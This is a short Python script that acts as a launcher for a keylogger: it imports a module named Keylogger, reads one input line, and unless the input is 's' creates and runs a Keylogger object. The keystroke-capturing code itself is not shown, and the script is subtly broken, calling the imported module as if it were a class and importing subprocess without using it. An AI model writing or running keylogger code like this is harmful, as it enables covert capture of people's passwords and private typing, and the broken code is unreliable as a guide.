import sys
import Keylogger
from subprocess import call

key = input()

if key != 's':
    kl = Keylogger()
    kl.run()
    input()
else:
    sys.exit()
